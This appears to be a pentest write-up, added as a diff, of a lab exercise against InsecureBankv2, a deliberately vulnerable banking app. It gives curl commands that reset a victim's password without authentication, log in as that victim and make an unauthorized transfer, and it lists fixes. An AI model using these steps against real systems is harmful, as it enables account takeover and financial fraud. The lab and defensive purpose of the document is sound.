@@ -1,0 +1,141 @@
+ Account Takeover & Unauthorized Transaction via Broken Authentication
+
+## 📌 Target
+
+**Application:** InsecureBankv2 (Android + Backend API)
+**Environment:** Local (Dockerized backend)
+
+---
+
+## 🧠 Summary
+
+A critical chain of vulnerabilities was identified that allows an attacker to:
+
+* Bypass authentication mechanisms
+* Reset any user’s password without authorization
+* Take over user accounts
+* Perform unauthorized financial transactions
+
+This results in **complete compromise of user accounts and financial integrity**.
+
+---
+
+## ⚠️ Vulnerabilities Identified
+
+### 1. 🔓 Authentication Bypass (`/devlogin`)
+
+* Endpoint returns success without validating credentials
+* Does not verify user existence in database
+
+---
+
+### 2. 🔑 Missing Authorization (`/changepassword`)
+
+* Allows password reset for any user
+* No authentication or session validation required
+
+---
+
+### 3. ⚠️ Weak Authentication Logic (`/dotransfer`)
+
+* Relies only on username/password
+* No session/token validation
+* No authorization checks on account ownership
+
+---
+
+## 🔗 Attack Chain
+
+1. Reverse engineered APK using jadx
+2. Identified hidden endpoint `/devlogin`
+3. Discovered authentication bypass
+4. Extracted valid users from database (`mydb.db`)
+5. Exploited `/changepassword` to reset victim password
+6. Logged in as victim user
+7. Retrieved account details via `/getaccounts`
+8. Executed unauthorized transfer via `/dotransfer`
+
+---
+
+## 💣 Impact
+
+* Full account takeover of any user
+* Unauthorized password resets
+* Exposure of financial account details
+* Unauthorized fund transfers
+
+> **Severity: CRITICAL**
+
+---
+
+## 🧪 Proof of Concept
+
+### Step 1 — Login as valid user
+
+```bash
+curl -X POST http://127.0.0.1:8888/login \
+-d "username=dinesh&password=Dinesh@123$"
+```
+
+---
+
+### Step 2 — Reset victim password (NO AUTH)
+
+```bash
+curl -X POST http://127.0.0.1:8888/changepassword \
+-d "username=jack&newpassword=hacked"
+```
+
+---
+
+### Step 3 — Login as victim
+
+```bash
+curl -X POST http://127.0.0.1:8888/login \
+-d "username=jack&password=hacked"
+```
+
+---
+
+### Step 4 — Retrieve accounts
+
+```bash
+curl -X POST http://127.0.0.1:8888/getaccounts \
+-d "username=jack&password=hacked"
+```
+
+---
+
+### Step 5 — Execute unauthorized transfer
+
+```bash
+curl -X POST http://127.0.0.1:8888/dotransfer \
+-d "username=jack&password=hacked&from_acc=999999999&to_acc=555555555&amount=500"
+```
+
+---
+
+## 🛠️ Remediation
+
+* Remove or secure `/devlogin` endpoint
+* Enforce authentication before password changes
+* Implement session/token-based authentication
+* Validate account ownership before transactions
+* Apply proper authorization checks on all endpoints
+
+---
+
+## 🧠 Key Takeaways
+
+* Mobile apps often expose backend attack surfaces
+* Business logic flaws can be more critical than technical bugs
+* Chaining vulnerabilities leads to real-world impact
+
+---
+
+## ⚔️ Author
+
+**Steve Ndana**
+Offensive Security | Pentesting | Red Team Path
+
+---
